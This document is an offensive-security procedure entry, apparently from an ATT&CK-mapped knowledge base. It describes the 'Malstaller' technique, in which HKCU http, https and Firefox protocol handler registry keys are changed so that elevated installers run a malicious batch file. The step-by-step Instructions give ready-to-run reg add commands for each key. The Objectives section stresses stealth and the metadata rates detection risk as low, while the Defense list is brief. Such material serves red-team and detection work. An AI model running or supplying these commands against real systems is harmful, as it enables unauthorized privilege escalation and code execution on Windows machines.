---
id: p1b2c3d4-e5f6-7890-abcd-ef1234567891
name: Tamper-with-HKCU-Protocol-Handler-Registry-Keys
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:19.902Z'
tactics:
  - '[[Privilege Escalation]]'
techniques:
  - '[[Modify Registry]]'
sub_techniques: []
tags:
  - registry
  - windows
  - tampering
commands:
  - '[[commands/reg-add-http-redirect]]'
platforms:
  - Windows
tools:
  - '[[tools/Registry-Editor]]'
skill_level: intermediate
impact_level: high
detection_risk: low
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Modify Registry]]'
---

# Tamper-with-HKCU-Protocol-Handler-Registry-Keys

## Summary

This procedure modifies user-writable HKEY_CURRENT_USER (HKCU) registry keys for HTTP/HTTPS protocols and Firefox associations to redirect URL handling to a malicious batch file, enabling hijacking during elevated processes like software installations.

## Description

In the Malstaller attack, low-privileged users exploit the fact that many Windows installers and native tools (e.g., perfmon.exe, mmc.exe) trust HKCU keys for protocol handlers without validation. By tampering with keys like [HKEY_CURRENT_USER\Software\Classes\https\shell\open\command], attackers point them to a local malicious script. When an admin triggers an elevated process that opens a URL (e.g., clicking a privacy policy link), UAC elevates the execution of the hijacked command, leading to RCE. This affects a wide range of software and requires no admin privileges for setup.

## Requirements

1. Low-privileged user access to the target Windows system
2. Registry editing permissions (default for HKCU)
3. Target software or tools that use HKCU for browser associations (e.g., Firefox)

## Defense

Defensive measures and detection strategies:

- Monitor HKCU modifications to protocol handler keys via Windows Event Logs (Event ID 4657)
- Enforce use of HKLM for protocol handlers in installers; validate commands before execution
- Deploy application whitelisting (e.g., AppLocker) to block unsigned batch scripts

## Objectives

1. Redirect protocol handling to attacker-controlled script
2. Set up conditions for elevated RCE without direct privilege
3. Maintain stealth by targeting only user-writable areas

## Instructions

### Step 1: Open Registry Editor

**Context**: Launch the tool to access HKCU hive for modifications.

**Command** ([[commands/reg-add-http-redirect]]):
```cmd
regedit
```

> Opens the Registry Editor GUI. Navigate to HKEY_CURRENT_USER\Software\Classes.

### Step 2: Modify HTTPS Handler

**Context**: Set the open command to invoke the malicious batch file with the URL parameter.

**Command** ([[commands/reg-add-http-redirect]]):
```cmd
reg add "HKEY_CURRENT_USER\Software\Classes\https\shell\open\command" /ve /d "C:\Users\%USERNAME%\Desktop\malstaller.bat %1" /f
```

> Adds or updates the default value to the batch file path plus %1 for the URL. Expected output: "The operation completed successfully."

### Step 3: Repeat for Other Keys

**Context**: Apply similar changes to HTTP, FirefoxHTML, and FirefoxURL for broader coverage.

**Command** ([[commands/reg-add-http-redirect]]):
```cmd
reg add "HKEY_CURRENT_USER\Software\Classes\http\shell\open\command" /ve /d "C:\Users\%USERNAME%\Desktop\malstaller.bat %1" /f
reg add "HKEY_CURRENT_USER\Software\Classes\FirefoxHTML\shell\open\command" /ve /d "C:\Users\%USERNAME%\Desktop\malstaller.bat %1" /f
reg add "HKEY_CURRENT_USER\Software\Classes\FirefoxURL\shell\open\command" /ve /d "C:\Users\%USERNAME%\Desktop\malstaller.bat %1" /f
```

> Verifies all keys are set. Success: No errors, query with `reg query` to confirm.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]] Privilege Escalation

### Techniques

- [[Modify Registry]] Modify Registry

### Sub-Techniques

- None

## Commands Used

- [[commands/reg-add-http-redirect]]

## Tools Used

- [[tools/Registry-Editor]]

## Tags

- [[registry]]
- [[windows]]
- [[tampering]]
